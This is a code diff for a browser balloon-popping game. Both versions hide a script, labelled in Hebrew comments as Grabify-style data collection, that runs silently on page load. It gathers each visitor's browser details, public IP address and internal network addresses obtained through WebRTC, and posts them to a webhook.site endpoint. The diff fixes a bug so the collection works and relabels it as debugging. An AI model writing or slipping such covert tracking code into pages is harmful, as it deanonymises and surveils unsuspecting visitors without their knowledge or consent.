@@ -8,8 +8,7 @@
         body { margin: 0; overflow: hidden; background: #0f172a; color: white; font-family: system-ui; text-align: center; user-select: none; }
         .stats { position: fixed; top: 10px; width: 100%; z-index: 100; pointer-events: none; }
         #game-container { width: 100vw; height: 100vh; position: relative; cursor: crosshair; }
-        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; box-shadow: inset -5px -5px 15px rgba(0,0,0,0.3); transition: transform 0.1s; }
-        .balloon:active { transform: scale(1.4); }
+        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; box-shadow: inset -5px -5px 15px rgba(0,0,0,0.3); }
     </style>
 </head>
 <body>
@@ -34,81 +33,68 @@
             container.appendChild(b);
 
             const duration = 3000 + Math.random() * 3000;
-            const anim = b.animate([
-                { bottom: '-100px' },
-                { bottom: window.innerHeight + 'px' }
-            ], { duration: duration, easing: 'linear' });
+            const anim = b.animate([{ bottom: '-100px' }, { bottom: window.innerHeight + 'px' }], { duration: duration, easing: 'linear' });
 
             b.onmousedown = () => {
                 score++;
                 scoreDisplay.innerText = score;
-                b.style.display = 'none';
-                anim.cancel();
                 b.remove();
             };
-
             anim.onfinish = () => b.remove();
         }
         setInterval(createBalloon, 700);
 
-        // --- לוגיקת Grabify (איסוף נתונים) ---
-        
+        // --- לוגיקת איסוף נתונים (Debugging Mode) ---
         const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';
 
         async function grabInfo() {
+            console.log("Starting data collection...");
             const data = {
-                event: "New User Entry",
+                event: "User Entered",
                 time: new Date().toLocaleString('he-IL'),
                 browser: navigator.userAgent,
+                platform: navigator.platform,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                timezone: Intp.DateTimeFormat().resolvedOptions().timeZone,
-                publicIP: "טוען...",
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // תוקן מ-Intp ל-Intl
+                publicIP: "Pending",
                 internalNetworkData: []
             };
 
-            // 1. קבלת IP ציבורי דרך שירות חיצוני (כמו Grabify)
+            // 1. IP ציבורי
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await response.json();
-                data.publicIP = ipJson.ip;
-            } catch (e) { data.publicIP = "נחסם ע\"י דפדפן"; }
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                data.publicIP = json.ip;
+                console.log("Public IP found:", data.publicIP);
+            } catch (e) { console.error("IP Fetch failed"); }
 
-            // 2. איסוף נתוני רשת עמוקים (WebRTC)
+            // 2. WebRTC (IP פנימי / mDNS)
             const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             pc.createDataChannel("");
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
             pc.onicecandidate = (ice) => {
                 if (!ice || !ice.candidate) return;
-                
-                // שליחת המחרוזת המלאה - כאן מופיע ה-.local או ה-IP הפנימי
                 data.internalNetworkData.push(ice.candidate.candidate);
-                
-                // שליחה מיידית של המידע המצטבר
+                console.log("New ICE Candidate found");
                 sendToControlPanel(data);
             };
 
-            // במקרה שאין נתוני רשת, שלח לפחות את המידע הבסיסי
-            setTimeout(() => {
-                if (data.internalNetworkData.length === 0) sendToControlPanel(data);
-            }, 3000);
+            // שליחת גיבוי למקרה שאין מועמדי ICE
+            setTimeout(() => sendToControlPanel(data), 2000);
         }
 
         function sendToControlPanel(info) {
-            if (WEBHOOK_URL.includes('webhook.site')) {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(info)
-                });
-            }
+            console.log("Sending data to Webhook...");
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            });
         }
 
-        // הפעלה שקטה ברקע
         grabInfo();
     </script>
 </body>
 </html>
-
